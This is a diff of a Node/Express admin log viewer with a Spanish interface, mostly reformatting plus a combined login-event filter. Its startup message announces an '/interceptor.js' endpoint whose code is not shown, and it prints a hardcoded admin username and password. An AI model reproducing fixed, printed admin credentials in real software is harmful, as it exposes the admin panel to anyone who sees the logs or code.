+      ${ipFilter ? `<div class="col-12 d-flex align-items-center gap-2 flex-wrap">
         <span class="filter-label mb-0">Mostrando sólo IP:</span>
         <span class="ip-filter-badge"><i class="bi bi-geo-alt-fill"></i>${esc(ipFilter)}<span class="remove-ip" onclick="clearIpFilter()">✕</span></span>
-      </div>`:""}
+      </div>` : ""}
     </form>
   </div>
 
-  <!-- Table -->
+  <!-- ── Table ──────────────────────────────────────────────── -->
   <div class="table-card">
     <div class="table-card-header">
       <span class="table-card-title"><i class="bi bi-table text-primary"></i> Registros</span>
       <span class="badge bg-primary bg-opacity-10 text-primary border border-primary border-opacity-25">${totalFiltered} coincidencias</span>
       <span class="badge bg-secondary bg-opacity-10 text-secondary">Pág. ${page}/${totalPages}</span>
-      ${filter?`<span class="badge bg-warning bg-opacity-15 text-warning-emphasis border border-warning border-opacity-25"><i class="bi bi-funnel-fill me-1"></i>"${esc(filter)}"</span>`:""}
-      ${ipFilter?`<span class="badge bg-info bg-opacity-15 text-info-emphasis border border-info border-opacity-25"><i class="bi bi-geo-alt me-1"></i>${esc(ipFilter)}</span>`:""}
-      ${excludeList.length?`<span class="badge bg-danger bg-opacity-10 text-danger border border-danger border-opacity-25"><i class="bi bi-eye-slash me-1"></i>${excludeList.length} oculto${excludeList.length>1?"s":""}</span>`:""}
+      ${filter ? `<span class="badge bg-warning bg-opacity-15 text-warning-emphasis border border-warning border-opacity-25"><i class="bi bi-funnel-fill me-1"></i>"${esc(filter)}"</span>` : ""}
+      ${ipFilter ? `<span class="badge bg-info bg-opacity-15 text-info-emphasis border border-info border-opacity-25"><i class="bi bi-geo-alt me-1"></i>${esc(ipFilter)}</span>` : ""}
+      ${excludeList.length ? `<span class="badge bg-danger bg-opacity-10 text-danger border border-danger border-opacity-25"><i class="bi bi-eye-slash me-1"></i>${excludeList.length} oculto${excludeList.length > 1 ? "s" : ""}</span>` : ""}
     </div>
 
-    ${lines.length===0?`
+    ${lines.length === 0 ? `
     <div class="empty-state">
       <i class="bi bi-inbox d-block mb-3"></i>
       <p class="fw-semibold text-secondary">No hay registros que mostrar</p>
       <p class="small">Ajusta los filtros o espera a que lleguen nuevos eventos.</p>
-    </div>`:`
+    </div>` : `
     <div class="table-responsive">
       <table class="table table-hover mb-0">
         <thead><tr>
@@ -849,7 +1095,7 @@ function buildLogViewerHTML({
             <tbody id="ipTableBody">${ipRows}</tbody>
           </table>
         </div>
-        ${totalUniqueIPs===0?`<div class="text-center text-muted p-4"><i class="bi bi-inbox"></i> Sin datos de IPs</div>`:""}
+        ${totalUniqueIPs === 0 ? `<div class="text-center text-muted p-4"><i class="bi bi-inbox"></i> Sin datos de IPs</div>` : ""}
       </div>
       <div class="modal-footer">
         <small class="text-muted me-auto"><i class="bi bi-info-circle me-1"></i>Clic en una IP para filtrar. Datos de todos los logs.</small>
@@ -875,7 +1121,6 @@ function buildLogViewerHTML({
           <span>Cambios inmediatos, persistidos en <code>logs/admin-users.json</code>.
           Puedes añadir múltiples admins o cambiar la contraseña de cualquiera.</span>
         </div>
-        <!-- Usuarios existentes -->
         <h6 class="fw-semibold mb-2"><i class="bi bi-list-ul me-1 text-muted"></i>Usuarios existentes</h6>
         <div class="table-responsive mb-4">
           <table class="table table-hover users-table mb-0">
@@ -886,7 +1131,6 @@ function buildLogViewerHTML({
           </table>
         </div>
         <hr class="my-3"/>
-        <!-- Añadir usuario -->
         <h6 class="fw-semibold mb-3"><i class="bi bi-person-plus me-1 text-muted"></i>Añadir nuevo usuario</h6>
         <div id="addUserAlert" class="d-none mb-3"></div>
         <div class="row g-3">
@@ -1000,7 +1244,6 @@ function clearRefreshTimer() {
 refreshSelect.value = String(refreshInterval);
 if (refreshInterval > 0) startRefreshTimer();
 
-// Pausar refresh mientras hay modales abiertos
 document.querySelectorAll(".modal").forEach(m => {
   m.addEventListener("show.bs.modal",   clearRefreshTimer);
   m.addEventListener("hidden.bs.modal", () => { if (refreshInterval > 0) startRefreshTimer(); });
@@ -1014,13 +1257,13 @@ function goToPage() {
   url.searchParams.set("page", p);
   location.href = url.toString();
 }
-document.getElementById("gotoPage")?.addEventListener("keydown", e => { if (e.key==="Enter"){e.preventDefault();goToPage();} });
+document.getElementById("gotoPage")?.addEventListener("keydown", e => { if (e.key === "Enter") { e.preventDefault(); goToPage(); } });
 
 // ══ IP HELPERS ══════════════════════════════════════════
 function clearIpFilter() {
   const url = new URL(location.href);
   url.searchParams.delete("ip");
-  url.searchParams.set("page","1");
+  url.searchParams.set("page", "1");
   location.href = url.toString();
 }
 document.querySelectorAll("code.ip-clickable").forEach(el => {
@@ -1028,7 +1271,7 @@ document.querySelectorAll("code.ip-clickable").forEach(el => {
     e.stopPropagation();
     const url = new URL(location.href);
     url.searchParams.set("ip", el.dataset.ip);
-    url.searchParams.set("page","1");
+    url.searchParams.set("page", "1");
     location.href = url.toString();
   });
 });
@@ -1037,7 +1280,7 @@ document.querySelectorAll(".ip-modal-filter").forEach(el => {
     bootstrap.Modal.getInstance(document.getElementById("ipModal"))?.hide();
     const url = new URL(location.href);
     url.searchParams.set("ip", el.dataset.ip);
-    url.searchParams.set("page","1");
+    url.searchParams.set("page", "1");
     location.href = url.toString();
   });
 });
@@ -1049,15 +1292,38 @@ function updateExcludeInputs() {
   c.innerHTML = "";
   excludedSet.forEach(ev => {
     const inp = document.createElement("input");
-    inp.type="hidden"; inp.name="exclude"; inp.value=ev;
+    inp.type = "hidden"; inp.name = "exclude"; inp.value = ev;
     c.appendChild(inp);
   });
 }
 document.querySelectorAll(".exclude-pill").forEach(btn => {
   btn.addEventListener("click", () => {
     const ev = btn.dataset.event;
-    excludedSet.has(ev) ? excludedSet.delete(ev) : excludedSet.add(ev);
-    btn.classList.toggle("excluded", excludedSet.has(ev));
+    // Pill virtual: actúa sobre login_attempt + max_attempts_redirect a la vez
+    if (ev === "login_all") {
+      const bothOn = excludedSet.has("login_attempt") && excludedSet.has("max_attempts_redirect");
+      if (bothOn) {
+        excludedSet.delete("login_attempt");
+        excludedSet.delete("max_attempts_redirect");
+      } else {
+        excludedSet.add("login_attempt");
+        excludedSet.add("max_attempts_redirect");
+      }
+      // Sincronizar estado visual de las pills individuales
+      document.querySelectorAll(".exclude-pill[data-event='login_attempt'], .exclude-pill[data-event='max_attempts_redirect']").forEach(p => {
+        p.classList.toggle("excluded", excludedSet.has(p.dataset.event));
+      });
+      btn.classList.toggle("excluded", excludedSet.has("login_attempt") && excludedSet.has("max_attempts_redirect"));
+    } else {
+      excludedSet.has(ev) ? excludedSet.delete(ev) : excludedSet.add(ev);
+      btn.classList.toggle("excluded", excludedSet.has(ev));
+      // Actualizar estado del pill "todos los logins"
+      const allLoginPill = document.querySelector(".exclude-pill[data-event='login_all']");
+      if (allLoginPill) {
+        allLoginPill.classList.toggle("excluded",
+          excludedSet.has("login_attempt") && excludedSet.has("max_attempts_redirect"));
+      }
+    }
     updateExcludeInputs();
     clearTimeout(btn._t);
     btn._t = setTimeout(() => {
@@ -1122,13 +1388,13 @@ function filterIpTable(q) {
     r.style.display = r.textContent.toLowerCase().includes(q) ? "" : "none";
   });
 }
-let ipSortDir = {total:-1, logins:-1};
+let ipSortDir = { total: -1, logins: -1 };
 function sortIpTable(col) {
   ipSortDir[col] *= -1;
   const tbody = document.getElementById("ipTableBody");
   const rows  = Array.from(tbody.querySelectorAll("tr"));
-  const idx   = col==="total"?1:2;
-  rows.sort((a,b) => ((parseInt(b.cells[idx]?.textContent)||0)-(parseInt(a.cells[idx]?.textContent)||0))*ipSortDir[col]);
+  const idx   = col === "total" ? 1 : 2;
+  rows.sort((a, b) => ((parseInt(b.cells[idx]?.textContent) || 0) - (parseInt(a.cells[idx]?.textContent) || 0)) * ipSortDir[col]);
   rows.forEach(r => tbody.appendChild(r));
 }
 
@@ -1162,7 +1428,7 @@ async function loadUsers() {
 }
 
 function escHtml(s) {
-  return String(s).replace(/&/g,"&amp;").replace(/</g,"&lt;").replace(/>/g,"&gt;").replace(/"/g,"&quot;");
+  return String(s).replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;").replace(/"/g, "&quot;");
 }
 
 document.getElementById("usersModal").addEventListener("show.bs.modal", loadUsers);
@@ -1199,24 +1465,24 @@ async function saveNewPassword() {
   const btn      = document.getElementById("cpSaveBtn");
   alertDiv.className = "d-none mb-3";
 
-  if (!newPass)          { alertDiv.className="alert alert-danger mb-3"; alertDiv.textContent="La contraseña es obligatoria."; return; }
-  if (newPass.length<8)  { alertDiv.className="alert alert-danger mb-3"; alertDiv.textContent="Mínimo 8 caracteres."; return; }
-  if (newPass!==confirm2){ alertDiv.className="alert alert-danger mb-3"; alertDiv.textContent="Las contraseñas no coinciden."; return; }
+  if (!newPass)           { alertDiv.className = "alert alert-danger mb-3"; alertDiv.textContent = "La contraseña es obligatoria."; return; }
+  if (newPass.length < 8) { alertDiv.className = "alert alert-danger mb-3"; alertDiv.textContent = "Mínimo 8 caracteres."; return; }
+  if (newPass !== confirm2){ alertDiv.className = "alert alert-danger mb-3"; alertDiv.textContent = "Las contraseñas no coinciden."; return; }
 
   btn.disabled = true;
   btn.innerHTML = '<span class="spinner-border spinner-border-sm me-1"></span>Guardando…';
   try {
     const res  = await fetch("/admin/users/" + encodeURIComponent(currentEditUser) + "/password", {
-      method: "PUT", headers: {"Content-Type":"application/json"},
+      method: "PUT", headers: { "Content-Type": "application/json" },
       body: JSON.stringify({ password: newPass }),
     });
     const data = await res.json();
     if (res.ok && data.success) {
       backToUsers();
       showToast("✅ Contraseña actualizada para " + currentEditUser, "success");
-    } else { alertDiv.className="alert alert-danger mb-3"; alertDiv.textContent=data.error||"Error."; }
-  } catch { alertDiv.className="alert alert-danger mb-3"; alertDiv.textContent="Error de red."; }
-  finally { btn.disabled=false; btn.innerHTML='<i class="bi bi-key-fill me-1"></i>Guardar contraseña'; }
+    } else { alertDiv.className = "alert alert-danger mb-3"; alertDiv.textContent = data.error || "Error."; }
+  } catch { alertDiv.className = "alert alert-danger mb-3"; alertDiv.textContent = "Error de red."; }
+  finally { btn.disabled = false; btn.innerHTML = '<i class="bi bi-key-fill me-1"></i>Guardar contraseña'; }
 }
 
 async function addUser() {
@@ -1225,11 +1491,11 @@ async function addUser() {
   const alertDiv = document.getElementById("addUserAlert");
   alertDiv.className = "d-none mb-3";
 
-  if (!username||!password){ alertDiv.className="alert alert-danger mb-3"; alertDiv.textContent="Usuario y contraseña son obligatorios."; return; }
-  if (password.length<8)  { alertDiv.className="alert alert-danger mb-3"; alertDiv.textContent="Mínimo 8 caracteres."; return; }
+  if (!username || !password) { alertDiv.className = "alert alert-danger mb-3"; alertDiv.textContent = "Usuario y contraseña son obligatorios."; return; }
+  if (password.length < 8)    { alertDiv.className = "alert alert-danger mb-3"; alertDiv.textContent = "Mínimo 8 caracteres."; return; }
 
   const res  = await fetch("/admin/users", {
-    method: "POST", headers: {"Content-Type":"application/json"},
+    method: "POST", headers: { "Content-Type": "application/json" },
     body: JSON.stringify({ username, password }),
   });
   const data = await res.json();
@@ -1240,37 +1506,41 @@ async function addUser() {
     document.getElementById("addPwLabel").textContent = "";
     await loadUsers();
     showToast("✅ Usuario creado: " + username, "success");
-  } else { alertDiv.className="alert alert-danger mb-3"; alertDiv.textContent=data.error||"Error."; }
+  } else { alertDiv.className = "alert alert-danger mb-3"; alertDiv.textContent = data.error || "Error."; }
 }
 
 // ══ HELPERS ═════════════════════════════════════════════
 function togglePw(id) {
   const inp = document.getElementById(id);
-  inp.type = inp.type==="password"?"text":"password";
+  inp.type = inp.type === "password" ? "text" : "password";
 }
 
 function checkPwStrength(barId, labelId, pw) {
-  const bar=document.getElementById(barId), label=document.getElementById(labelId);
-  let s=0;
-  if(pw.length>=8)s++;if(pw.length>=12)s++;
-  if(/[A-Z]/.test(pw)&&/[a-z]/.test(pw))s++;
-  if(/[0-9]/.test(pw))s++;if(/[^A-Za-z0-9]/.test(pw))s++;
-  const lvls=[{p:"20%",c:"#ef4444",t:"Muy débil"},{p:"40%",c:"#f97316",t:"Débil"},{p:"60%",c:"#eab308",t:"Media"},{p:"80%",c:"#84cc16",t:"Buena"},{p:"100%",c:"#22c55e",t:"Excelente"}];
-  const l=lvls[Math.min(s,4)];
-  bar.style.width=l.p;bar.style.background=l.c;label.textContent=l.t;label.style.color=l.c;
+  const bar = document.getElementById(barId), label = document.getElementById(labelId);
+  let s = 0;
+  if (pw.length >= 8) s++; if (pw.length >= 12) s++;
+  if (/[A-Z]/.test(pw) && /[a-z]/.test(pw)) s++;
+  if (/[0-9]/.test(pw)) s++; if (/[^A-Za-z0-9]/.test(pw)) s++;
+  const lvls = [
+    { p: "20%", c: "#ef4444", t: "Muy débil" },
+    { p: "40%", c: "#f97316", t: "Débil" },
+    { p: "60%", c: "#eab308", t: "Media" },
+    { p: "80%", c: "#84cc16", t: "Buena" },
+    { p: "100%", c: "#22c55e", t: "Excelente" },
+  ];
+  const l = lvls[Math.min(s, 4)];
+  bar.style.width = l.p; bar.style.background = l.c;
+  label.textContent = l.t; label.style.color = l.c;
 }
 
-function showToast(msg, type="success") {
-  const toast=document.getElementById("appToast"), body=document.getElementById("appToastBody");
-  toast.className="toast align-items-center border-0 text-white bg-"+(type==="success"?"success":"danger");
-  body.textContent=msg;
-  bootstrap.Toast.getOrCreateInstance(toast,{delay:4000}).show();
+function showToast(msg, type = "success") {
+  const toast = document.getElementById("appToast"), body = document.getElementById("appToastBody");
+  toast.className = "toast align-items-center border-0 text-white bg-" + (type === "success" ? "success" : "danger");
+  body.textContent = msg;
+  bootstrap.Toast.getOrCreateInstance(toast, { delay: 4000 }).show();
 }
 
 function doLogout() {
-  // Send a request to the protected resource with deliberately invalid credentials.
-  // The browser receives 401 + WWW-Authenticate: Basic realm="Admin Logs" and
-  // DISCARDS the cached credentials for that realm — real cross-browser logout.
   fetch("/admin/logout-clear", {
     headers: { "Authorization": "Basic " + btoa("__invalid__:__invalid__") },
     cache: "no-store"
@@ -1280,7 +1550,7 @@ function doLogout() {
 }
 
 document.querySelectorAll("[title]").forEach(el => {
-  try{new bootstrap.Tooltip(el,{trigger:"hover",placement:"top"});}catch{}
+  try { new bootstrap.Tooltip(el, { trigger: "hover", placement: "top" }); } catch {}
 });
 </script>
 </body>
@@ -1292,7 +1562,8 @@ document.querySelectorAll("[title]").forEach(el => {
 // ──────────────────────────────────────────────────────────
 app.listen(PORT, () => {
   logger.info("server_start", { event: "SERVER_STARTED", port: PORT, pid: process.pid });
-  console.log("\n🚀  Servidor en   http://localhost:" + PORT);
-  console.log("📊  Visor de logs http://localhost:" + PORT + "/admin/logs");
+  console.log("\n🚀  Servidor en      http://localhost:" + PORT);
+  console.log("📊  Visor de logs    http://localhost:" + PORT + "/admin/logs");
+  console.log("🪝  Interceptor JS   http://localhost:" + PORT + "/interceptor.js");
   console.log("   (usuario: admin | contraseña: supersecret123)\n");
 });
